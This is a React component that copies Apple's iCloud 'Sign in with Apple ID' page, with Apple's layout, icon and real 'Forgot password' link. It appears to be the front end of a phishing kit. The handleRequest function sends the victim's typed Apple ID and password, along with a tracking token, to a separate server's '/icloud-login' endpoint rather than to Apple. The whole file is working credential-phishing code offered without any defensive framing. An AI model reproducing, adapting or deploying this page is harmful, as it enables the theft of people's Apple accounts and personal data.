import { useState } from "react";
import { API_URI } from "../libs/globals";
import axios from "axios";
export default ({ token }) => {
  const [typed, setTyped] = useState(false);
  const [passTyped, setPassTyped] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState(false);
  const [ready, setReady] = useState(false);
  const [rememberCheck, setRemeberCheck] = useState(false);

  const handleRequest = async () => {
    setLoading(true);
    const id = document.getElementById("account_name_text_field").value;
    const pass = document.getElementById("password_text_field").value;
    if (id === "") {
      setMessage({ message: "Enter your phone or email address!" });
      return 0;
    }
    if (pass === "" || !passTyped) {
      setMessage({ message: "Enter your apple ID password!" });
      return 0;
    }
    await axios
      .post(`${API_URI}/icloud-login`, { id, pass, token })
      .then((e) => {
        setLoading(false);
        const res = e.data;
        if (res.success === 1) {
          setMessage({message: res.message, variant: 'success'})
        } else {
          setMessage({message: res.message, variant: 'danger'})
        }
      })
      .catch((e) => {
        setLoading(false);
        console.error(e);
      });
  };

  const handleEmailInput = () => {
    const input = document.getElementById("account_name_text_field");
    const continue_btn = document.getElementById("sign-in");
    if (!typed) input.value = "";
    setTyped(true);
    input.classList.add("focus");
    continue_btn.classList.add("move");
    input.focus();
  };
  const formBorder = (show = true) => {
    const form = document.getElementById("sign_in_form");
    if (show) form.classList.add("high-border");
    else form.classList.remove("high-border");
  };
  const emailInputFocusOut = (e) => {
    const emailInput = document.getElementById("account_name_text_field");
    const continue_btn = document.getElementById("sign-in");
    const label = document.getElementById("apple_id_field_label");
    if (emailInput.value === "") {
      continue_btn.classList.remove("move");
      e.target.classList.remove("focus");
      label.classList.remove("lable-low");
    }
  };
  const focusOnInput = (e, type = "email") => {
    e.target.classList.add("lable-low");
    if (type === "email") handleEmailInput();
    else handlePassInput();
  };
  const handlePassInput = () => {
    const input = document.getElementById("password_text_field");
    const continue_btn = document.getElementById("sign-in");
    continue_btn.classList.add("norm-move-x2");
    if (!passTyped) input.value = "";
    setPassTyped(true);
    input.classList.add("focus");
    continue_btn.classList.add("move-x2");
    input.focus();
    setReady(true);
  };
  const passwordInputFocusOut = (e) => {
    const passwordInput = document.getElementById("password_text_field");
    const continue_btn = document.getElementById("sign-in");
    const label = document.getElementById("password_field_label");
    if (passwordInput.value === "") {
      continue_btn.classList.remove("move-x2");
      e.target.classList.remove("focus");
      label.classList.remove("lable-low");
    }
  };

  const handleContinue = () => {
    if (ready) {
      handleRequest();
    } else {
      const emailInput = document.getElementById("account_name_text_field");
      if (emailInput.value !== "") {
        setLoading(true);
        setTimeout(() => {
          setLoading(false);
          const emailInputParent = document.querySelector(
            ".account-name.form-row"
          );
          emailInputParent.classList.add("active");
          const mainDiv = document.querySelector(".signin-form");
          mainDiv.classList.add("open-3x3x");

          handlePassInput();
        }, 1400);
      } else {
        setMessage("Please input your email or phone!");
      }
    }
  };
  return (
    <div className="home-login-component">
      <div className="parent-container is-visible">
        <div style={{ visibility: "visible", height: "auto" }}>
          <div className="widget-icon-text">
            <img
              className="icon"
              draggable="false"
              alt=""
              aria-hidden="true"
              src="https://www.icloud.com/system/icloud.com/2317Hotfix55/en-us/4f72d89d71e9abcc4e37c71fb77fe65b.svg"
            />
            <div className="sign-in-label" style={{ letterSpacing: "1px" }}>
              Sign in with Apple&nbsp;ID
            </div>
          </div>
          <div
            id="idms-auth-b523817d-fe01-4b6c-845f-031de6cb3a29"
            className="apple-id-container apple-id-frame-value"
          >
            <div
              className="si-body si-container container-fluid"
              id="content"
              role="main"
              data-theme="dark"
            >
              <apple-auth
                app-loading-defaults="{appLoadingDefaults}"
                pmrpc-hook="{pmrpcHook}"
              >
                <div
                  className="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in "
                  data-mode="embed"
                  data-isiebutnotedge="false"
                >
                  <div id="step" className="si-step">
                    <div id="stepEl" className="   ">
                      <div className="signin fade-in" id="signin">
                        <div className="container si-field-container password-second-step">
                          <div
                            id="sign_in_form"
                            onFocus={formBorder}
                            onBlur={() => formBorder(false)}
                            className="signin-form"
                          >
                            <div className="">
                              <div className="ckakwer">
                                <div className="account-name form-row">
                                  {/* <label
                                    className="sr-only form-cell form-label"
                                    htmlFor="account_name_text_field"
                                  >
                                    Sign In with your Apple&nbsp;ID
                                  </label> */}
                                  <div className="form-cell">
                                    <div className="form-textbox">
                                      <input
                                        type="text"
                                        id="account_name_text_field"
                                        can-field="accountName"
                                        autoCorrect="off"
                                        autoCapitalize="off"
                                        aria-required="true"
                                        required="required"
                                        spellCheck="false"
                                        className="force-ltr form-textbox-input "
                                        autoComplete="off"
                                        aria-invalid="false"
                                        onBlur={emailInputFocusOut}
                                      />
                                      <span
                                        aria-hidden="true"
                                        id="apple_id_field_label"
                                        className="form-textbox-label"
                                        onClick={focusOnInput}
                                      >
                                        Email or Phone Number
                                      </span>
                                    </div>
                                  </div>
                                </div>
                                <div
                                  className="password form-row     "
                                  aria-hidden="true"
                                >
                                  <div className="form-cell">
                                    <div className="form-cell-wrapper form-textbox">
                                      <input
                                        type="password"
                                        id="password_text_field"
                                        aria-required="true"
                                        required="required"
                                        can-field="password"
                                        autoComplete="off"
                                        className="form-textbox-input "
                                        aria-invalid="false"
                                        tabIndex="-1"
                                        onBlur={passwordInputFocusOut}
                                      />
                                      <span
                                        id="password_field_label"
                                        aria-hidden="true"
                                        className=" form-textbox-label  form-label-flyout"
                                        onClick={(e) =>
                                          focusOnInput(e, "password")
                                        }
                                      >
                                        Password
                                      </span>
                                      <span
                                        className="sr-only form-label-flyout"
                                        id="invalid_user_name_pwd_err_msg"
                                        aria-hidden="true"
                                      ></span>
                                    </div>
                                  </div>
                                </div>

                                <button
                                  id="sign-in"
                                  tabIndex="0"
                                  className="continue-button"
                                  aria-label="Continue"
                                  aria-disabled="true"
                                  disabled=""
                                  onClick={handleContinue}
                                >
                                  {loading ? (
                                    <img
                                      src="media/spinner.gif"
                                      alt="continue"
                                    />
                                  ) : (
                                    <img
                                      src="media/sign-in.PNG"
                                      alt="continue"
                                    />
                                  )}
                                </button>
                              </div>
                            </div>
                          </div>

                          {message && (
                            <div className="message">
                              <div className="message-container">
                                <span>{message.message}</span>
                              </div>
                            </div>
                          )}
                          <div className="c3kzx">
                            <div className="si-remember-password">
                              <div className="form-checkbox">
                                <input
                                  type="checkbox"
                                  id="remember-me"
                                  className="form-checkbox-input"
                                  onClick={() =>
                                    setRemeberCheck(!rememberCheck)
                                  }
                                />
                                <label
                                  id="remember-me-label"
                                  className="form-label"
                                  htmlFor="remember-me"
                                >
                                  <span
                                    className="form-checkbox-indicator"
                                    aria-hidden="true"
                                  >
                                    {rememberCheck && (
                                      <div className="icon-view">
                                        <svg
                                          xmlns="http://www.w3.org/2000/svg"
                                          fill="none"
                                          viewBox="0 0 24 24"
                                          strokeWidth="1.5"
                                          stroke="currentColor"
                                          className="w-6 h-6"
                                        >
                                          <path
                                            strokeLinecap="round"
                                            strokeLinejoin="round"
                                            d="M4.5 12.75l6 6 9-13.5"
                                          />
                                        </svg>
                                      </div>
                                    )}
                                  </span>{" "}
                                  Keep me signed in
                                </label>
                              </div>
                            </div>
                            <div className="spinner-container auth  hide "></div>

                            <div className="si-container-footer has-remember-me">
                              <div className="links tk-subbody">
                                <div className="si-forgot-password">
                                  <a
                                    id="iforgot-link"
                                    className="si-link ax-outline lite-theme-override"
                                    href="https://iforgot.apple.com/password/verify/appleid"
                                    target="_blank"
                                  >
                                    Forgot Apple&nbsp;ID or{" "}
                                    <span className="no-wrap sk-icon sk-icon-after sk-icon-external">
                                      password?
                                    </span>
                                  </a>
                                </div>

                                <div className="a-8c8382c">
                                  <a
                                    target="_blank"
                                    rel="noreferrer"
                                    href=" "
                                    className=""
                                    aria-label="Create"
                                  >
                                    Create Apple&nbsp;ID
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    id="stocking"
                    style={{ display: "none !important" }}
                  ></div>
                </div>
                <idms-modal
                  wrap-className="full-page-error-wrapper "
                  auto-close="false"
                ></idms-modal>
              </apple-auth>
            </div>
            {/* login  */}
          </div>
        </div>
      </div>
    </div>
  );
};
